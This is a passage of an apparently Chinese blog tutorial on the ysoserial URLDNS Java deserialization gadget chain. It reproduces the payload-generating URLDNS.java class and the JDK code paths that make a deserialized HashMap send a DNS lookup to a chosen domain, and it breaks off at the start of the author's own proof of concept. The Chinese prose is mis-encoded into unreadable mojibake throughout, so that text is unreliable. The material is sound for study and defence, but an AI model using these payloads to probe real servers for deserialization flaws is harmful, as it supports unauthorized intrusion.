åˆ©ç”¨é“¾åªèƒ½å‘èµ·DNSè¯·æ±‚ï¼Œå¹¶ä¸èƒ½è¿›è¡Œå…¶ä»–åˆ©ç”¨ ä¸é™åˆ¶jdkç‰ˆæœ¬ï¼Œä½¿ç”¨Javaå†…ç½®ç±»ï¼Œå¯¹ç¬¬ä¸‰æ–¹ä¾èµ–æ²¡æœ‰è¦æ±‚ ç›®æ ‡æ— å›æ˜¾ï¼Œå¯ä»¥é€šè¿‡DNSè¯·æ±‚æ¥éªŒè¯æ˜¯å¦å­˜åœ¨ååºåˆ—åŒ–æ¼æ´ å¯ä»¥åœ¨ysoserialé¡¹ç›®æºç é‡Œçœ‹åˆ°URLDNSåˆ©ç”¨é“¾çš„æºç ï¼Œåœ°å€ã€‚ä¹Ÿå¯ä»¥æ‰’åˆ°æœ¬åœ°æ¥å†åœ¨ideaä¸Šè°ƒè¯•ã€‚\nideaé…ç½®è°ƒè¯•ysoserial å…ˆç›´æ¥åœ¨githubä¸Šä¸‹è½½æºç ï¼Œç„¶åå†ç”¨ideaæ‰“å¼€è¿™ä¸ªé¡¹ç›®å³å¯ï¼Œæˆ‘ç”¨çš„JDK8ï¼Œæ­¤æ—¶pom.xmlä¼šæŠ¥é”™ï¼Œæ­¤æ—¶å°±ç‚¹å‡»ideaå³è¾¹çš„mï¼Œå¦‚ä¸‹ï¼š\nç„¶åå°†é‡Œé¢æ‰€æœ‰çš„é…ç½®æ–‡ä»¶å‹¾é€‰ï¼Œå†ç‚¹å‡»å·¦ä¸Šè§’ä¸¤ä¸ªç®­å¤´æ—‹è½¬çš„æ ‡è¯†å³å¯ã€‚\néšåå°±ä¸ä¼šå†æŠ¥é”™ã€‚\næ­¤æ—¶æˆ‘ä»¬å†çœ‹pom.xmlï¼Œæ¥æ‰¾é¡¹ç›®çš„å…¥å£ç‚¹ï¼ˆå°±æ˜¯ä¸»ç±»å’Œmainå‡½æ•°ï¼‰ï¼Œå¦‚ä¸‹ï¼š\næ ¹æ®è¿™ä¸ªæ‰¾åˆ° src/main/java/ysoserial/GeneratePayload.java\nç‚¹å‡»mainå‡½æ•°å·¦è¾¹çš„ç»¿è‰²ç®­å¤´ï¼Œç‚¹å‡»è°ƒè¯•ï¼Œä¸‹é¢å°±åªä¼šæ‰“å°usageï¼Œå¦‚ä¸‹ï¼š\nè¿™æ˜¯å› ä¸ºæ²¡åŠ ä»»ä½•å‚æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬æ‰“å¼€Debug Configurationsï¼š\nå†åœ¨è¿™é‡Œæ·»åŠ å‚æ•°å³å¯ï¼š\næˆ‘è¿™é‡Œæ˜¯æ·»åŠ çš„DNSï¼Œå¦‚ä¸‹ï¼š\nç„¶ååœ¨URLDNSçš„getObject()æ–¹æ³•åŠ ä¸€ä¸ªæ–­ç‚¹ï¼Œå†åœ¨mainå‡½æ•°ç‚¹å‡»è°ƒè¯•å°±èƒ½æ­£å¸¸è·å–å€¼ï¼Œå¦‚ä¸‹ï¼š å¯ä»¥çœ‹å‡ºå·²ç»æ­£å¸¸è·å–åˆ°äº†å€¼ã€‚åŒç†å¦‚æœæƒ³è¦ä½¿ç”¨å…¶ä»–è¯¸å¦‚CC1ä¹‹ç±»çš„é“¾å­ï¼Œå°±æ”¹ä¸º CommomCollections1 'id' å³å¯ã€‚\nåˆ©ç”¨é“¾åˆ†æ ä»ä¸»å‡½æ•°å¼€å§‹ï¼Œåœ¨æˆ‘ä¼ å…¥å‚æ•°åï¼Œæ¥è°ƒè¯•çœ‹ä¸€ä¸‹\nå¯ä»¥çœ‹åˆ°æ­¤æ—¶payloadTypeçš„å€¼ä¸ºURLDNSï¼Œé‚£ä¹ˆæˆ‘ä»¬è·Ÿè¿›ä¸€ä¸‹getPayloadClasså‡½æ•°ï¼Œ\nå¯ä»¥çœ‹å‡ºè¿™é‡Œä½¿ç”¨åå°„è°ƒç”¨äº†URLDNSç±»(åå°„éœ€è¦æ³¨æ„åŒ…çš„é—®é¢˜)ï¼Œå³URLDNSå¯¹åº”çš„è„šæœ¬çš„classå¯¹è±¡å¹¶å°†å…¶returnã€‚\næ­¤æ—¶å°±å¯ä»¥çœ‹åˆ° payloadClass çš„å€¼ä¸º class ysoserial.payloads.URLDNS ï¼Œç„¶åæˆ‘ä»¬ç»§ç»­çœ‹åç»­ä»£ç ï¼Œå…ˆæ˜¯ä½¿ç”¨newInstance()å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡ï¼Œç„¶åå†è°ƒç”¨å¯¹è±¡çš„getObject() æ–¹æ³•ï¼Œå³è„šæœ¬URLDNS.javaçš„getObject()æ–¹æ³•ï¼ŒCTRL+é¼ æ ‡å·¦é”®ç»§ç»­è·Ÿè¿›è¿™ä¸ªæ–¹æ³•ï¼Œå¯ä»¥å‘ç°å®šä¹‰çš„ä¸€ä¸ªæ¥å£ç±»ï¼Œåº”è¯¥æ˜¯URLDNSä¸­é‡å†™äº†è¿™ä¸ªæ–¹æ³•ï¼š\nç„¶åç»§ç»­è°ƒè¯•ï¼Œéšåä¼šè¿›å…¥åˆ°URLDNSç±»çš„getObject()æ–¹æ³•ï¼Œå¦‚ä¸‹ï¼š\nè¿™é‡Œå¯ä»¥çœ‹å‡ºURLDNSå®ç°äº†ObjectPayloadæ¥å£ï¼Œåœ¨è¿™é‡ŒURLDNSç±»é‡å†™äº† getObject() æ–¹æ³•å¹¶ä¸”æ­¤æ—¶çš„urlå³ä¸ºæˆ‘ä¼ è¿›å»çš„åŸŸåã€‚\nå…ˆç»§ç»­çœ‹mainï¼Œåœ¨getObject()æ–¹æ³•åï¼Œä¼šè°ƒç”¨serialize()æ–¹æ³•ï¼Œè·Ÿè¿›çœ‹ï¼š\nå¯ä»¥çœ‹åˆ°å°±æ˜¯åœ¨è¿™é‡Œè¿›è¡Œäº†åºåˆ—åŒ–ã€‚\nç°åœ¨ç»§ç»­åˆ†æURLDNSé“¾ï¼Œçœ‹URLDNS.javaæºç \n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 package ysoserial.payloads; import java.io.IOException; import java.net.InetAddress; import java.net.URLConnection; import java.net.URLStreamHandler; import java.util.HashMap; import java.net.URL; import ysoserial.payloads.annotation.Authors; import ysoserial.payloads.annotation.Dependencies; import ysoserial.payloads.annotation.PayloadTest; import ysoserial.payloads.util.PayloadRunner; import ysoserial.payloads.util.Reflections; /** * A blog post with more details about this gadget chain is at the url below: * https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/ * * This was inspired by Philippe Arteau @h3xstream, who wrote a blog * posting describing how he modified the Java Commons Collections gadget * in ysoserial to open a URL. This takes the same idea, but eliminates * the dependency on Commons Collections and does a DNS lookup with just * standard JDK classes. * * The Java URL class has an interesting property on its equals and * hashCode methods. The URL class will, as a side effect, do a DNS lookup * during a comparison (either equals or hashCode). * * As part of deserialization, HashMap calls hashCode on each key that it * deserializes, so using a Java URL object as a serialized key allows * it to trigger a DNS lookup. * * Gadget Chain: * HashMap.readObject() * HashMap.putVal() * HashMap.hash() * URL.hashCode() * * */ @SuppressWarnings({ \u0026#34;rawtypes\u0026#34;, \u0026#34;unchecked\u0026#34; }) @PayloadTest(skip = \u0026#34;true\u0026#34;) @Dependencies() @Authors({ Authors.GEBL }) public class URLDNS implements ObjectPayload\u0026lt;Object\u0026gt; { public Object getObject(final String url) throws Exception { //Avoid DNS resolution during payload creation //Since the field \u0026lt;code\u0026gt;java.net.URL.handler\u0026lt;/code\u0026gt; is transient, it will not be part of the serialized payload. URLStreamHandler handler = new SilentURLStreamHandler(); HashMap ht = new HashMap(); // HashMap that will contain the URL URL u = new URL(null, url, handler); // URL to use as the Key ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup. Reflections.setFieldValue(u, \u0026#34;hashCode\u0026#34;, -1); // During the put above, the URL\u0026#39;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered. return ht; } public static void main(final String[] args) throws Exception { PayloadRunner.run(URLDNS.class, args); } /** * \u0026lt;p\u0026gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance. * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior * using the serialized object.\u0026lt;/p\u0026gt; * * \u0026lt;b\u0026gt;Potential false negative:\u0026lt;/b\u0026gt; * \u0026lt;p\u0026gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the * second resolution.\u0026lt;/p\u0026gt; */ static class SilentURLStreamHandler extends URLStreamHandler { protected URLConnection openConnection(URL u) throws IOException { return null; } protected synchronized InetAddress getHostAddress(URL u) { return null; } } } é‡Œé¢ç»™äº†URLDNSçš„åˆ©ç”¨é“¾ï¼š\n1 2 3 4 5 6 7 /** * Gadget Chain: * HashMap.readObject() * HashMap.putVal() * HashMap.hash() * URL.hashCode() */ è¿™é‡Œæ³¨æ„çœ‹URLDNSç±»çš„getObjectæ–¹æ³•ï¼Œysoserialä¼šè°ƒç”¨è¿™ä¸ªæ–¹æ³•è·å¾—Payloadã€‚å®¡è¿™ä¸ªæ–¹æ³•çš„æºç å¯ä»¥å‘ç°æœ€åè¿”å›çš„æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œè€Œè¿™ä¸ªå¯¹è±¡å°±æ˜¯æœ€åå°†è¢«åºåˆ—åŒ–çš„å¯¹è±¡ï¼Œåœ¨è¿™é‡Œæ˜¯HashMapã€‚è¿™é‡Œçœ‹ä¸€ä¸‹åˆ©ç”¨çš„getObject()æ–¹æ³•ï¼Œå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 public Object getObject(final String url) throws Exception { //Avoid DNS resolution during payload creation---åœ¨åˆ›å»ºæœ‰æ•ˆè´Ÿè½½æ—¶é¿å…DNSè§£æ //Since the field \u0026lt;code\u0026gt;java.net.URL.handler\u0026lt;/code\u0026gt; is transient, it will not be part of the serialized payload. URLStreamHandler handler = new SilentURLStreamHandler(); HashMap ht = new HashMap(); // HashMap that will contain the URL URL u = new URL(null, url, handler); // URL to use as the Key ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup. Reflections.setFieldValue(u, \u0026#34;hashCode\u0026#34;, -1); // During the put above, the URL\u0026#39;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered. return ht; } è¿™ä¸ªæ–¹æ³•çš„ä½œç”¨æ˜¯ç”Ÿæˆä¸€ä¸ªæ„é€ å¥½äº†çš„HashMapå¯¹è±¡ï¼Œè¯¥HashMapçš„é”®æ˜¯ä¸€ä¸ªç‰¹å®šçš„URLå¯¹è±¡ã€‚å½“æˆ‘ä»¬åœ¨åˆ©ç”¨æ—¶ï¼Œå³HashMapè¢«ååºåˆ—åŒ–æ—¶ï¼ŒURLå¯¹è±¡ä¼šè¢«ååºåˆ—åŒ–å¹¶è§¦å‘DNSè¯·æ±‚ã€‚ ç°åœ¨æ¥åˆ†æä¸€ä¸‹è¿™ä¸ªgetObject()æ–¹æ³•ã€‚\nå¯¹äºç¬¬ä¸€éƒ¨åˆ†çš„å®ä¾‹åŒ–ä»£ç ï¼š\n1 URLStreamHandler handler = new SilentURLStreamHandler(); å…¶ä¸­çš„URLStreamHandleræ˜¯ä¸€ä¸ªæŠ½è±¡ç±»ï¼Œæ‰€ä»¥ä¸èƒ½å¤Ÿè¢«å®ä¾‹åŒ–ï¼Œæ‰€ä»¥è¿™é‡Œåœ¨URLDNS.javaé‡Œåˆ›å»ºäº†ä¸€ä¸ªå­ç±»SilentURLStreamHandlerï¼Œå¹¶é‡å†™äº†getHostAddress()æ–¹æ³•å’ŒopenConnection()ï¼Œå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 static class SilentURLStreamHandler extends URLStreamHandler { protected URLConnection openConnection(URL u) throws IOException { return null; } protected synchronized InetAddress getHostAddress(URL u) { return null; } } } é‚£ä¹ˆè¿™é‡Œä¸ºä»€ä¹ˆè¦é‡å†™è¿™ä¸¤ä¸ªæ–¹æ³•å‘¢ï¼Ÿå¯¹äºopenConnection()æ–¹æ³•ï¼Œåº”è¯¥æ˜¯å› ä¸ºçˆ¶ç±»æ˜¯æŠ½è±¡ç±»å¹¶ä¸”å­ç±»ä¸æ˜¯æŠ½è±¡çš„ï¼Œæ‰€ä»¥å­ç±»å¿…é¡»å°†æ¥å£æ–¹æ³•å®ç°ã€‚\né‚£ä¹ˆä¸ºä»€ä¹ˆè¦é‡å†™getHostAddress()æ–¹æ³•å‘¢ï¼Œå¦‚æœå°†è¿™ä¸ªé‡å†™çš„æ–¹æ³•æ³¨é‡Šæ‰ï¼Œé‚£ä¹ˆå½“æˆ‘ä»¬ç”Ÿæˆpayloadæ—¶ï¼Œå°±ä¼šè§¦å‘DNSè¯·æ±‚ï¼Œæˆ‘ä»¬æ¥çœ‹æ­£å¸¸çš„ getHostAddress() æ–¹æ³•\nåœ¨è¿™ä¸ªgetHostAddress()æ–¹æ³•ä¸­ï¼Œé‡Œé¢çš„**InetAddress.getByName(host)**æ–¹æ³•ä¼šå»å‘é€è¯·æ±‚ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿™é‡Œé‡å†™è¿™ä¸ªæ–¹æ³•ï¼Œè¿™æ ·åœ¨åˆ©ç”¨è¿™ä¸ªæ–¹æ³•æ—¶ï¼Œä¸ä¼šè¯·æ±‚æˆ‘ä»¬çš„hostAddressã€‚\nè¿˜æœ‰ä¸€ä¸ªé‡è¦çš„ç‚¹å°±æ˜¯åœ¨URL.javaä¸­ï¼Œhandlerè¢«transinetå…³é”®å­—ä¿®é¥°ï¼Œåœ¨åºåˆ—åŒ–å¯¹è±¡çš„æ—¶å€™ï¼Œhandlerå±æ€§ä¸ä¼šè¢«åºåˆ—åŒ–ã€‚æ‰€ä»¥æ„å‘³ç€é‡å†™çš„æ–¹æ³•å¹¶ä¸ä¼šå¸¦è¿›æˆ‘ä»¬çš„payloadä¸­ï¼Œè¿™æ ·æˆ‘ä»¬åœ¨è§¦å‘ååºåˆ—åŒ–æ¼æ´æ—¶ï¼ŒgetHostAddresså¹¶æ²¡æœ‰è¢«é‡å†™ï¼Œèƒ½å¤Ÿæ­£å¸¸è¯·æ±‚æˆ‘ä»¬çš„ç½‘å€ã€‚è¿™ä¹Ÿæ˜¯æˆ‘è§‰å¾—å¾ˆç²¾å¦™çš„ä¸€ä¸ªåœ°æ–¹ã€‚\nï¼ˆè¿™é‡Œåªéœ€è¦äº†è§£ï¼Œå…·ä½“çš„è¯·æ±‚è¿‡ç¨‹çœ‹äº†åæ–‡å°±æ¸…æ¥šäº†ï¼‰\nç°åœ¨æ¥çœ‹ç¬¬äºŒéƒ¨åˆ†ï¼Œä¹Ÿæ˜¯æœ¬ç¯‡æ–‡ç« æœ€ä¸»è¦çš„éƒ¨åˆ†ï¼š\n1 2 3 4 5 6 7 HashMap ht = new HashMap(); // HashMap that will contain the URL URL u = new URL(null, url, handler); // URL to use as the Key ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup. Reflections.setFieldValue(u, \u0026#34;hashCode\u0026#34;, -1); // During the put above, the URL\u0026#39;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered. return ht; ç°åœ¨æ¥çœ‹HashMapç±»ï¼Œå®ç°äº†Serializableæ¥å£ï¼Œé‡å†™äº†readObject()æ–¹æ³•\nåœ¨ä¹‹å‰è¯´è¿‡çš„ååºåˆ—åŒ–çš„çŸ¥è¯†ç‚¹é‚£é‡Œå¯ä»¥çŸ¥é“è§¦å‘ååºåˆ—åŒ–çš„æ–¹æ³•æ˜¯readObjectï¼Œå¹¶ä¸”å› ä¸ºJavaå¼€å‘è€…ï¼ˆåŒ…æ‹¬Javaå†…ç½®åº“çš„å¼€å‘è€…ï¼‰ç»å¸¸ä¼šåœ¨è¿™â¾¥â¾¯å†™â¾ƒâ¼°çš„é€»è¾‘ï¼Œå¯¼è‡´åœ¨è¿™é‡Œå¯ä»¥æ„é€ åˆ©â½¤é“¾ã€‚\nç°åœ¨å°±çœ‹ä¸€ä¸‹HashMapç±»çš„readObject()æ–¹æ³•ï¼Œæºä»£ç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 private void readObject(ObjectInputStream s) throws IOException, ClassNotFoundException { ObjectInputStream.GetField fields = s.readFields(); // Read loadFactor (ignore threshold) float lf = fields.get(\u0026#34;loadFactor\u0026#34;, 0.75f); if (lf \u0026lt;= 0 || Float.isNaN(lf)) throw new InvalidObjectException(\u0026#34;Illegal load factor: \u0026#34; + lf); lf = Math.min(Math.max(0.25f, lf), 4.0f); HashMap.UnsafeHolder.putLoadFactor(this, lf); reinitialize(); s.readInt(); // Read and ignore number of buckets int mappings = s.readInt(); // Read number of mappings (size) if (mappings \u0026lt; 0) { throw new InvalidObjectException(\u0026#34;Illegal mappings count: \u0026#34; + mappings); } else if (mappings == 0) { // use defaults } else if (mappings \u0026gt; 0) { float fc = (float)mappings / lf + 1.0f; int cap = ((fc \u0026lt; DEFAULT_INITIAL_CAPACITY) ? DEFAULT_INITIAL_CAPACITY : (fc \u0026gt;= MAXIMUM_CAPACITY) ? MAXIMUM_CAPACITY : tableSizeFor((int)fc)); float ft = (float)cap * lf; threshold = ((cap \u0026lt; MAXIMUM_CAPACITY \u0026amp;\u0026amp; ft \u0026lt; MAXIMUM_CAPACITY) ? (int)ft : Integer.MAX_VALUE); // Check Map.Entry[].class since it\u0026#39;s the nearest public type to // what we\u0026#39;re actually creating. SharedSecrets.getJavaOISAccess().checkArray(s, Map.Entry[].class, cap); @SuppressWarnings({\u0026#34;rawtypes\u0026#34;,\u0026#34;unchecked\u0026#34;}) Node\u0026lt;K,V\u0026gt;[] tab = (Node\u0026lt;K,V\u0026gt;[])new Node[cap]; table = tab; // Read the keys and values, and put the mappings in the HashMap for (int i = 0; i \u0026lt; mappings; i++) { @SuppressWarnings(\u0026#34;unchecked\u0026#34;) K key = (K) s.readObject(); @SuppressWarnings(\u0026#34;unchecked\u0026#34;) V value = (V) s.readObject(); putVal(hash(key), key, value, false, false); } } } ä¸»è¦ä»£ç ä¸ºï¼š\n1 2 3 4 5 6 7 8 9 10 //è¯»å–é”®å’Œå€¼ï¼Œå¹¶å°†æ˜ å°„æ”¾å…¥HashMapä¸­ for (int i = 0; i \u0026lt; mappings; i++) { @SuppressWarnings(\u0026#34;unchecked\u0026#34;) K key = (K) s.readObject(); @SuppressWarnings(\u0026#34;unchecked\u0026#34;) V value = (V) s.readObject(); putVal(hash(key), key, value, false, false); } //è·Ÿè¿›æºç å¯ä»¥çœ‹å‡ºè¿™é‡Œçš„readObjectæœ€ç»ˆæŒ‡å‘çš„å°±æ˜¯ObjectInputStreamç±»çš„readObjectæ–¹æ³•ï¼Œå³åœ¨è¿™é‡Œååºåˆ—åŒ–ï¼Œä½†æ˜¯åœ¨è¿™é‡Œåªæ˜¯HashMapç±»ååºçš„å…¶ä¸­ä¸€æ­¥ã€‚ ç†è§£ä¸€ä¸‹ä»£ç ï¼Œå¯ä»¥çœ‹å‡ºé‡ç‚¹åœ¨\n1 putVal(hash(key), key, value, false, false); è¿™ä¸ªæ–¹æ³•çš„ä½œç”¨ä¸ºä¸ºæ·»åŠ é”®å€¼å¯¹åˆ°å“ˆå¸Œè¡¨ï¼Œè¿™é‡Œå…ˆåœä¸€ä¸‹ï¼Œç°åœ¨å…ˆæ¥çœ‹URLDNSç±»é‡Œé¢ä½¿ç”¨çš„å¯¹åº”çš„HashMaoç±»çš„putæ–¹æ³•ï¼Œå¦‚ä¸‹ï¼š\n1 ht.put(u, url); æˆ‘ä»¬è·Ÿè¿›ä¸€ä¸‹è¿™ä¸ªputæ–¹æ³•çš„æºä»£ç ï¼š\n1 2 3 public V put(K key, V value) { return putVal(hash(key), key, value, false, true); } å¯ä»¥çœ‹åˆ°è¿™é‡Œçš„putçš„å†…å®¹æ˜¯å·®ä¸å¤šçš„ï¼Œç„¶ååœ¨getObjectçš„putæ–¹æ³•ä¸‹æ–­ç‚¹ï¼Œå¼ºåˆ¶æ­¥å…¥ï¼Œå¯ä»¥çœ‹åˆ°å¦‚ä¸‹ç»“æœï¼š\nä¹Ÿå°±æ˜¯å‰é¢ååºåˆ—åŒ–ç›¸å¯¹åº”çš„ä»£ç ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘åœ¨HashMapå¯¹è±¡ä¸­æ”¾è¿›çš„é”®å€¼å¯¹ï¼Œåœ¨ååºåˆ—åŒ–æ—¶å…¶å®ä¹Ÿæ˜¯è°ƒç”¨çš„åŒæ ·çš„ä»£ç æ¥æ”¾å…¥ååºåˆ—åŒ–å¾—åˆ°çš„HashMapå¯¹è±¡ä¸­ã€‚\nç„¶åç»§ç»­çœ‹HashMapçš„readObject()ä¸­çš„putVal()æ–¹æ³•ï¼Œé‡Œé¢è°ƒç”¨äº†hash()æ–¹æ³•ï¼Œè·Ÿè¿›çœ‹ä¸€ä¸‹ï¼š\n1 2 3 4 static final int hash(Object key) { int h; return (key == null) ? 0 : (h = key.hashCode()) ^ (h \u0026gt;\u0026gt;\u0026gt; 16); } ç®€å•æ¥è¯´å°±æ˜¯åˆ¤æ–­keyæ˜¯å¦ä¸ºnullï¼Œä¸ºNullçš„è¯å°±è¿”å›0ï¼Œå¦åˆ™å°†å¯¹keyè¿›è¡Œä½¿ç”¨hashCode()æ–¹æ³•åèµ‹å€¼ç»™hå¹¶å°†è¿™ä¸ªhè¿›è¡Œä½ç§»16ä½çš„å¼‚æˆ–æ“ä½œï¼Œåº”è¯¥æ—¶ç”²é…¸å“ˆå¸Œå€¼çš„æ“ä½œã€‚\né‡ç‚¹å°±åœ¨äºè¿™ä¸ªhashCode()æ–¹æ³•ï¼Œåœ¨ysoerialä¸­æˆ‘ä»¬äººä¸ºåœ°å°†keyæ”¹ä¸ºæˆ‘ä»¬ä¼ å…¥çš„java.net.URLå¯¹è±¡ï¼Œé‚£ä¹ˆç°åœ¨æ¥çœ‹è¿™ä¸ªç±»çš„hashCode()æ–¹æ³•ï¼š\n1 2 3 4 5 6 7 8 public synchronized int hashCode() { if (hashCode != -1) return hashCode; hashCode = handler.hashCode(this); return hashCode; } //è¿™é‡Œéœ€è¦æ³¨æ„çš„å°±æ˜¯åœ¨è°ƒç”¨å®ŒhashCode()æ–¹æ³•åï¼Œå˜é‡hashCodeçš„å€¼ä¼šè¢«æ”¹å˜ã€‚ æ­¤æ—¶åˆ¤æ–­è¿™ä¸ªhashCodeæ˜¯å¦ä¸ºä¸º-1ï¼Œå¹¶ä¸”åœ¨URLç±»ä¸­çš„hashCodeå€¼é»˜è®¤ä¸º-1\nè¿™é‡Œå€¼ä¸º-1ï¼Œç„¶åç»§ç»­ï¼Œå½“ä¸º-1çš„æƒ…å†µä¸‹çš„handlerå¯¹è±¡ç±»å‹ä¸ºï¼š\næ‰€ä»¥è¿™é‡Œè°ƒç”¨çš„å°±æ˜¯URLStreamHandlerç±»çš„hashCode()æ–¹æ³•ï¼ˆè¿™é‡Œå¼ºè°ƒå¯¹è±¡ä¸æ–¹æ³•çš„æ‰€å±å…³ç³»ï¼Œåé¢æ‹‰é€šæ¥è®²å¾ˆæœ‰ç”¨ï¼‰ï¼Œæ‰€ä»¥æºä»£ç ä¸ºï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 //è¿™ä¸ªæ–¹æ³•ä¼šå‘èµ·è¯·æ±‚å¹¶ä¸”è®¡ç®—hashCodeçš„å€¼ï¼Œæ‰€ä»¥è¿™é‡Œçš„hashCodeä¼šæ”¹å˜ protected int hashCode(URL u) { int h = 0; // Generate the protocol part. String protocol = u.getProtocol(); if (protocol != null) h += protocol.hashCode(); // Generate the host part. InetAddress addr = getHostAddress(u); if (addr != null) { h += addr.hashCode(); } else { String host = u.getHost(); if (host != null) h += host.toLowerCase().hashCode(); } // Generate the file part. String file = u.getFile(); if (file != null) h += file.hashCode(); // Generate the port part. if (u.getPort() == -1) h += getDefaultPort(); else h += u.getPort(); // Generate the ref part. String ref = u.getRef(); if (ref != null) h += ref.hashCode(); return h; } uå°±æ˜¯æˆ‘ä»¬ä¼ å…¥çš„urlï¼Œåœ¨è°ƒç”¨getHostAddressæ–¹æ³•æ—¶ï¼Œå°±ä¼šè¿›è¡ŒDNSæŸ¥è¯¢ï¼Œæ–¹æ³•æºä»£ç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 synchronized InetAddress getHostAddress() { if (hostAddress != null) { return hostAddress; } if (host == null || host.isEmpty()) { return null; } try { hostAddress = InetAddress.getByName(host); } catch (UnknownHostException | SecurityException ex) { return null; } return hostAddress; } è¿™é‡Œçš„InetAddress.getByName(host)çš„ä½œç”¨æ˜¯æ ¹æ®ä¸»æœºåï¼Œè·å–å…¶IPåœ°å€ï¼Œåœ¨ç½‘ç»œä¸Šå…¶å®å°±æ˜¯ä¸€æ¬¡DNSæŸ¥è¯¢ã€‚\nå¤§è‡´å®Œç»“ï¼Œæ‹‰é€šä¸€ä¸‹ï¼Œysoserialé“¾çš„åºåˆ—åŒ–è¿‡ç¨‹ï¼š\nä½¿ç”¨è‡ªå®šä¹‰çš„URLDNSç±»çš„getObject()æ–¹æ³•è·å–åˆ°payloadï¼Œé‡ç‚¹æ˜¯getObjectæ–¹æ³•ï¼Œä¸‹é¢æ¥è¯´ä¸€ä¸‹æ–¹æ³•çš„æµç¨‹ ï¼ˆåœ¨è¿™ä¸ªæ–¹æ³•ä¸­ï¼Œåœ¨getObject()æ–¹æ³•ç¬¬ä¸€è¡Œæˆ‘ä»¬å®šä¹‰äº†handlerï¼Œå¹¶å°†å…¶è‡ªå®šä¹‰çš„SilentURLStreamHandlerç±»å®ä¾‹åŒ–èµ‹å€¼ç»™handlerã€‚ åœ¨ç¬¬äºŒè¡Œæˆ‘ä»¬å®ä¾‹åŒ–äº†ä¸€ä¸ªHashMapç±»ã€‚ åœ¨ç¬¬ä¸‰è¡Œå®ä¾‹åŒ–äº†ä¸€ä¸ªURLç±»ï¼Œæ­¤æ—¶URLç±»ä¸­çš„handlerå¯¹åº”çš„å¯¹è±¡ä¸ºæˆ‘ä»¬è‡ªå®šä¹‰çš„SilentURLStreamHandlerç±»å¹¶ä¸”æ³¨æ„æˆ‘ä»¬åœ¨è¿™ä¸ªç±»ä¸­é‡å†™äº†getHostAddress()æ–¹æ³• åœ¨ç¬¬å››è¡Œä½¿ç”¨äº†HashMapç±»çš„putæ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•çš„æºç åœ¨å‰é¢è¯´è¿‡ï¼Œæœ¬è´¨å·®ä¸å¤šï¼Œå¤§è‡´ä¸ºHashMap#putVal()-\u0026gt;HashMap#hash-\u0026gt;URL#hashCode-\u0026gt;handlerå¯¹è±¡#hashCodeã€‚æ³¨æ„ï¼Œç”±äºæ­¤æ—¶çš„handlerä¸ºæˆ‘ä»¬é‡å†™çš„ç±»ï¼Œæ‰€ä»¥æœ€ç»ˆä¼šè°ƒç”¨æˆ‘ä»¬é‡å†™çš„getHostAddress()æ–¹æ³•ï¼Œä½†æ˜¯æ­¤æ—¶ä¼šè¿”å›nullï¼Œæ‰€ä»¥å¹¶ä¸ä¼šå‘èµ·è¯·æ±‚ã€‚ åœ¨ç¬¬äº”è¡Œæˆ‘ä»¬æœ¬è´¨ä¸Šæ˜¯è°ƒç”¨äº†åå°„æ¥æ›´æ”¹hashCodeçš„å€¼ä¸º-1ï¼Œè¿™æ˜¯å› ä¸ºæˆ‘ä»¬åœ¨å‰é¢è°ƒç”¨URL#HashCodeæ—¶ä¼šå°†ç±»é‡Œçš„hashCodeæ”¹å€¼ï¼Œè¿™æ ·ä¼šå¯¼è‡´URLç±»é‡Œé¢çš„hashCodeå€¼ä¸ä¸º-1ï¼Œæ‰€ä»¥éœ€è¦åå°„æ”¹å€¼ï¼Œè¿™æ ·æ‰èƒ½ä¿è¯åœ¨URLç±»é‡Œçš„hashCode()æ–¹æ³•èƒ½è·³åˆ°URLStreamHandlerç±»ä¸­ã€‚ï¼‰ æœ€ç»ˆè·å–åˆ°è¿™ä¸ªpayloadåä¼šå°†å…¶åºåˆ—åŒ–ï¼Œæˆ‘ä»¬åªéœ€è¦å°†å…¶ååºåˆ—åŒ–å³å¯è®¿é—®ã€‚ è¿™é‡Œçš„æµç¨‹ä¹ŸåŸºæœ¬å°†å‰é¢è®²çš„å‡ ä¸ªéœ€è¦æ³¨æ„çš„ç‚¹éƒ½è¯´æ˜äº†ï¼Œè¿™é‡Œå°±ä¸å¤šè¯´äº†ã€‚\nååºè¿‡ç¨‹ï¼š\nååºHashMapç±»ï¼Œä¼šè°ƒç”¨HashMapç±»çš„readObject()æ–¹æ³•ï¼Œå…¶å®å’Œå‰é¢éƒ½å¤§å·®ä¸å·®ã€‚ å¯ä»¥è‡ªå·±ç¼–å†™ä¸€ä¸ªPOCï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 package java_foundation; import java.net.InetAddress; import java.net.URL; import java.net.URLConnection; import java.net.URLStreamHandler; 